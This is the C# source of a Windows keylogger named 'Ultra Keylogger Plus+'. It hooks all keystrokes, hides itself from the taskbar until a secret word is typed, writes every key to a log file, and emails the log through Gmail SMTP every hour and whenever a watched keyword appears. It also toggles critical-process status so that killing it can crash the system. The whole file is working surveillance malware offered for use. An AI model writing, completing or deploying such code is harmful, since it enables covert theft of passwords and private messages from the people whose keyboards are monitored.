using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using TestKeybdHook;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections;
using System.Net;
using System.Net.Mail;
using System.Diagnostics;

namespace ukp32_stub
{
    public partial class MainForm : Form
    {
        String writeUp;
        String secretWord;
        ArrayList keyWords;
        public static String emailAddress = "";
        private static bool emailEnabled;

        public MainForm()
        {
            InitializeComponent();
            ReadSecretWord();

            if (secretWord.CompareTo("") == 0)
            {
                this.ShowInTaskbar = true;
            }
            else
            {
                this.ShowInTaskbar = false;
                this.Refresh();
                Hook.CreateHook(KeyReaderr);

                this.button1.Enabled = false;
                this.button2.Enabled = true;
            }

            writeUp = "";

            initKeyWords();
        }

        private void initKeyWords() 
        {
            TextReader tr = new StreamReader("keywords.krs");

            String temp;

            keyWords = new ArrayList();

            do
            {
                // read a line of text
                temp = tr.ReadLine();
                if (temp != null)
                {
                    keyWords.Add(temp);
                }
            } while (temp != null);

            // close the stream
            tr.Close();
        }

        private void ReadSecretWord()
        {
            if (File.Exists("secret.krs"))
            {
                TextReader tr = new StreamReader("secret.krs");

                // read a line of text
                secretWord = tr.ReadLine();

                // close the stream
                tr.Close();
            }
            else
            {
                this.ShowInTaskbar = true;
                File.Create("secret.krs");
            }
        }

        private void ReadEmail()
        {
            TextReader tr = new StreamReader("email.krs");

            // read a line of text
            emailAddress = tr.ReadLine();

            // close the stream
            tr.Close();

            if (emailAddress == null || emailAddress == "")
            {
                Console.WriteLine("Email not found, must be in email.krs! :(");
                Console.Beep();
                button8.Enabled = false;
                emailEnabled = false;
            }
            else
            {
                button8.Enabled = true;
                emailEnabled = true;
            }

            textBox4.Text = emailAddress;
        }

        private void WriteSecretWord()
        {
            // create a writer and open the file
            TextWriter tw = new StreamWriter("secret.krs");

            // write a line of text to the file
            tw.Write(textBox1.Text);

            // close the stream
            tw.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {

            Hook.CreateHook(KeyReaderr);

            button2.Enabled = true;
            button1.Enabled = false;
        }

        public void KeyReaderr(IntPtr wParam, IntPtr lParam)
        {
            int key = Marshal.ReadInt32(lParam);

            Hook.VK vk = (Hook.VK)key;

            String temp = "";

            switch (vk)
            {
                case Hook.VK.VK_F1: temp = "<-F1->";
                    break;

                case Hook.VK.VK_F2: temp = "<-F2->";
                    break;
                case Hook.VK.VK_F3: temp = "<-F3->";
                    break;
                case Hook.VK.VK_F4: temp = "<-F4->";
                    break;
                case Hook.VK.VK_F5: temp = "<-F5->";
                    break;
                case Hook.VK.VK_F6: temp = "<-F6->";
                    break;
                case Hook.VK.VK_F7: temp = "<-F7->";
                    break;
                case Hook.VK.VK_F8: temp = "<-F8->";
                    break;
                case Hook.VK.VK_F9: temp = "<-F9->";
                    break;
                case Hook.VK.VK_F10: temp = "<-F10->";
                    break;
                case Hook.VK.VK_F11: temp = "<-F11->";
                    break;
                case Hook.VK.VK_F12: temp = "<-F12->";
                    break;                
                case Hook.VK.VK_NUMLOCK: temp = "<-numlock->";
                    break;               
                case Hook.VK.VK_SCROLL: temp = "<-scroll>";
                    break;
                case Hook.VK.VK_LSHIFT: temp = "<-left shift->";
                    break;
                case Hook.VK.VK_RSHIFT: temp = "<-right shift->";
                    break;
                case Hook.VK.VK_LCONTROL: temp = "<-left control->";
                    break;
                case Hook.VK.VK_RCONTROL: temp = "<-right control->";
                    break;
                case Hook.VK.VK_SEPERATOR: temp = "|";
                    break;
                case Hook.VK.VK_SUBTRACT: temp = "-";
                    break;
                case Hook.VK.VK_DECIMAL: temp = ".";
                    break;
                case Hook.VK.VK_DIVIDE: temp = "/";
                    break;
                case Hook.VK.VK_NUMPAD0: temp = "0";
                    break;
                case Hook.VK.VK_NUMPAD1: temp = "1";
                    break;
                case Hook.VK.VK_NUMPAD2: temp = "2";
                    break;
                case Hook.VK.VK_NUMPAD3: temp = "3";
                    break;
                case Hook.VK.VK_NUMPAD4: temp = "4";
                    break;
                case Hook.VK.VK_NUMPAD5: temp = "5";
                    break;
                case Hook.VK.VK_NUMPAD6: temp = "6";
                    break;
                case Hook.VK.VK_NUMPAD7: temp = "7";
                    break;
                case Hook.VK.VK_NUMPAD8: temp = "8";
                    break;
                case Hook.VK.VK_NUMPAD9: temp = "9";
                    break;
                case Hook.VK.VK_Q: temp = "q";
                    break;
                case Hook.VK.VK_W: temp = "w";
                    break;
                case Hook.VK.VK_E: temp = "e";
                    break;
                case Hook.VK.VK_R: temp = "r";
                    break;
                case Hook.VK.VK_T: temp = "t";
                    break;
                case Hook.VK.VK_Y: temp = "y";
                    break;
                case Hook.VK.VK_U: temp = "u";
                    break;
                case Hook.VK.VK_I: temp = "i";
                    break;
                case Hook.VK.VK_O: temp = "o";
                    break;
                case Hook.VK.VK_P: temp = "p";
                    break;
                case Hook.VK.VK_A: temp = "a";
                    break;
                case Hook.VK.VK_S: temp = "s";
                    break;
                case Hook.VK.VK_D: temp = "d";
                    break;
                case Hook.VK.VK_F: temp = "f";
                    break;
                case Hook.VK.VK_G: temp = "g";
                    break;
                case Hook.VK.VK_H: temp = "h";
                    break;
                case Hook.VK.VK_J: temp = "j";
                    break;
                case Hook.VK.VK_K: temp = "k";
                    break;
                case Hook.VK.VK_L: temp = "l";
                    break;
                case Hook.VK.VK_Z: temp = "z";
                    break;
                case Hook.VK.VK_X: temp = "x";
                    break;
                case Hook.VK.VK_C: temp = "c";
                    break;
                case Hook.VK.VK_V: temp = "v";
                    break;
                case Hook.VK.VK_B: temp = "b";
                    break;
                case Hook.VK.VK_N: temp = "n";
                    break;
                case Hook.VK.VK_M: temp = "m";
                    break;
                case Hook.VK.VK_0: temp = "0";
                    break;
                case Hook.VK.VK_1: temp = "1";
                    break;
                case Hook.VK.VK_2: temp = "2";
                    break;
                case Hook.VK.VK_3: temp = "3";
                    break;
                case Hook.VK.VK_4: temp = "4";
                    break;
                case Hook.VK.VK_5: temp = "5";
                    break;
                case Hook.VK.VK_6: temp = "6";
                    break;
                case Hook.VK.VK_7: temp = "7";
                    break;
                case Hook.VK.VK_8: temp = "8";
                    break;
                case Hook.VK.VK_9: temp = "9";
                    break;
                case Hook.VK.VK_SNAPSHOT: temp = "<-print screen->";
                    break;
                case Hook.VK.VK_INSERT: temp = "<-insert->";
                    break;
                case Hook.VK.VK_DELETE: temp = "<-delete->";
                    break;
                case Hook.VK.VK_BACK: temp = "<-backspace->";
                    break;
                case Hook.VK.VK_TAB: temp = "<-tab->";
                    break;
                case Hook.VK.VK_RETURN: temp = "<-enter->";
                    break;
                case Hook.VK.VK_PAUSE: temp = "<-pause->";
                    break;
                case Hook.VK.VK_CAPITAL: temp = "<-caps lock->";
                    break;
                case Hook.VK.VK_ESCAPE: temp = "<-esc->";
                    break;
                case Hook.VK.VK_SPACE: temp = "<-space->";
                    break;
                case Hook.VK.VK_PRIOR: temp = "<-page up->";
                    break;
                case Hook.VK.VK_NEXT: temp = "<-page down->";
                    break;
                case Hook.VK.VK_END: temp = "<-end->";
                    break;
                case Hook.VK.VK_HOME: temp = "<-home->";
                    break;
                case Hook.VK.VK_LEFT: temp = "<-arrow left->";
                    break;
                case Hook.VK.VK_UP: temp = "<-arrow up->";
                    break;
                case Hook.VK.VK_RIGHT: temp = "<-arrow right->";
                    break;
                case Hook.VK.VK_DOWN: temp = "<-arrow down->";
                    break;
                default: break;
            }

            writeUp = writeUp + temp;

            unhide();
            checkKeys();
            writeToFile(temp);
        }

        public void checkKeys()
        {
            int max = keyWords.Count;

            for (int i = 0; i < max; i++)
            {
                if (writeUp.Contains((String)keyWords[i]))
                {
                    //MessageBox.Show("KeyWord!");
                    //MessageBox.Show((String)keyWords[i]);
                    if (emailEnabled)
                    {
                        MailSender();
                        //sendMailK();
                    }
                    //writeUp = "";
                }
            }
        }

        public void MailSender()
        {
            Debug.Write("Sending email...\n");

            label5.Visible = true;

            sendEmailBackgroundWorker.RunWorkerAsync();

            while (sendEmailBackgroundWorker.IsBusy)
            {
                Application.DoEvents();
            }

            label5.Visible = false;
        }

        public void sendMailK()
        {
            writeUp = writeUp + "<-Send Email->";
            MailAddress Send = new MailAddress("logsender@email.com", "UKP32+");
            MailAddress Recieve = new MailAddress(emailAddress);
            MailMessage message = new MailMessage(Send, Recieve);
            message.Sender = new MailAddress("logsender@email.com", "UKP32+");
            message.Subject = Environment.UserName + "@" + Environment.MachineName + " UKP32+ Log";
            message.Body = "Log as of " + DateTime.Now + ".\nHere it is!\n\nLove,\nUltra Keylogger Plus+";
            SmtpClient emailClient = new SmtpClient();
            emailClient.UseDefaultCredentials = false;
            emailClient.Credentials = new System.Net.NetworkCredential("logsender@email.com", "yourpassword");
            emailClient.Host = "smtp.gmail.com";
            emailClient.Port = 587;
            emailClient.EnableSsl = true;
            emailClient.Timeout = 20000;
            System.Net.Mail.Attachment attach = new Attachment("logs.krs");
            message.Attachments.Add(attach);
            emailClient.Send(message);

            Debug.WriteLine("Sent email to " + emailAddress + "!");

            Application.Restart();
        }

        public void unhide()
        {
            if (writeUp.Contains(secretWord))
            {
                SayingLabel.ForeColor = SystemColors.ControlText;
                SayingLabel.Font = new System.Drawing.Font("Courier New", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));

                RandomPhrase();
                this.ShowInTaskbar = true;
                this.TransparencyKey = Color.Yellow;

                this.Refresh();

                writeUp = "";

                this.Visible = true;
                this.Refresh();
            }
        }

        private void RandomPhrase()
        {
            Random r = new Random();
            switch (r.Next(1, 15))
            {
                case 1:
                    SayingLabel.Text = "♫ Trolololo! ♫";
                    pictureBox1.Image = Properties.Resources.Trool;
                    break;
                case 2:
                    SayingLabel.Text = "umad bro?";
                    pictureBox1.Image = Properties.Resources.Trool;
                    break;
                case 3:
                    SayingLabel.Text = "Writer's Block";
                    pictureBox1.Image = Properties.Resources.derp;
                    break;
                case 4:
                    SayingLabel.Text = "Ummm.. This is quite awkward.";
                    pictureBox1.Image = Properties.Resources.pokerface;
                    break;
                case 5:
                    SayingLabel.Text = "LOL!";
                    SayingLabel.Font = new System.Drawing.Font("Arial", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
                    SayingLabel.ForeColor = Color.Red;
                    pictureBox1.Image = Properties.Resources.lol_meme;
                    break;
                case 6:
                    SayingLabel.Text = "Made by Dr. Sandman";
                    SayingLabel.ForeColor = Color.Purple;
                    pictureBox1.Image = Properties.Resources.foreveralone;
                    break;
                case 7:
                    SayingLabel.Text = "u jelly?";
                    pictureBox1.Image = Properties.Resources.Trool;
                    break;
                case 8:
                    SayingLabel.Text = "FFFFFFFUUUUUUUUUUUU-";
                    SayingLabel.ForeColor = Color.Red;
                    pictureBox1.Image = Properties.Resources.f7u12;
                    break;
                case 9:
                    SayingLabel.Text = "ME GUSTA";
                    pictureBox1.Image = Properties.Resources.megusta;
                    break;
                case 10:
                    SayingLabel.Text = "Not my problem.";
                    pictureBox1.Image = Properties.Resources.Trool;
                    break;
                case 11:
                    SayingLabel.Text = "F*CK YEAH!";
                    SayingLabel.Font = new System.Drawing.Font("Arial", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
                    SayingLabel.ForeColor = Color.Red;
                    pictureBox1.Image = Properties.Resources.ef_yeah;
                    break;
                case 12:
                    SayingLabel.Text = "CLOSE ENOUGH";
                    SayingLabel.Font = new System.Drawing.Font("Arial", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
                    SayingLabel.ForeColor = Color.Red;
                    pictureBox1.Image = Properties.Resources.ef_yeah;
                    break;
                case 13:
                    SayingLabel.Text = "Forever Alone";
                    SayingLabel.ForeColor = Color.Black;
                    pictureBox1.Image = Properties.Resources.foreveralone;
                    break;
                case 14:
                    SayingLabel.Text = "Herp Derp";
                    pictureBox1.Image = Properties.Resources.derp;
                    break;
            }
            this.Refresh();
        }

        public void writeToFile(String writing)
        {
            TextReader tr = new StreamReader("logs.krs");

            // read a line of text
            String secr = tr.ReadToEnd();

            // close the stream
            tr.Close();

            tr.Dispose();

            // create a writer and open the file
            TextWriter tw = new StreamWriter("logs.krs");
           
            // write a line of text to the file
            tw.WriteLine(secr + writing);

            // close the stream
            tw.Close();
        }

        public String readFromFile(String fil)
        {
            TextReader tr = new StreamReader("secret.krs");

            // read a line of text
            String secr = tr.ReadLine();

            // close the stream
            tr.Close();

            return secr;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Hook.DestroyHook();
            button2.Enabled = false;
            button1.Enabled = true;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            writeToFile(writeUp);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WriteSecretWord();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            present();
        }

        public void present()
        {
            TextReader tr = new StreamReader("logs.krs");

            // read a line of text
            String secr = tr.ReadToEnd();

            // close the stream
            tr.Close();

            textBox3.Text = secr;

            textBox3.Enabled = true;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            keyWords.Add(textBox2.Text);

            int max = keyWords.Count;

            TextWriter tw = new StreamWriter("keywords.krs");

            for(int i = 0; i < max; i++)
            {
                tw.WriteLine(keyWords[i]);
            }

            // close the stream
            tw.Close();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            hourSenderTimer.Start();
            ReadEmail();
        }

        private void CreditsButton_Click(object sender, EventArgs e)
        {
            // MessageBox.Show("Programming: Mr. Sandman, affixiate, Arxleol and dot-net-transitions.\nIdea: Joseph, Michael, and Mr. Sandman.\nMotivation: God, My Family and Friends.", "Credits", MessageBoxButtons.OK, MessageBoxIcon.Information);
            CreditsForm creditsDialog = new CreditsForm();
            creditsDialog.ShowDialog();
        }

        private void HideButton_Click(object sender, EventArgs e)
        {
            this.ShowInTaskbar = false;
            this.Refresh();
            this.Visible = false; // Sorry, Arxleol, but it's a bug.
        }

        private void button7_Click(object sender, EventArgs e)
        {
            TextWriter tw = new StreamWriter("email.krs");
            tw.Write(textBox4.Text);
            tw.Close();
            emailAddress = textBox4.Text; // just in case ;)
            Transitions.Transition.run(button7, "BackColor", Color.Green, new Transitions.TransitionType_Flash(1, 500));
            ReadEmail(); // refresh
        }

        private void button8_Click(object sender, EventArgs e)
        {
            MailSender();
        }

        private void QuitButton_Click(object sender, EventArgs e)
        {
            AdjustCritical(0);
            Console.WriteLine("Exiting...");
            Environment.Exit(666);
        }

        /* Ripped from CCritical.cs - I don't want a BSoD to happen, if ukp32 is killed from itself */

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
  
        private static void AdjustCritical(int enable)
        {
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref enable, sizeof(int));
        }

        private void sendEmailBackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            sendMailK();
        }

        private void hourSenderTimer_Tick(object sender, EventArgs e)
        {
            MailSender();
        }
    }
}
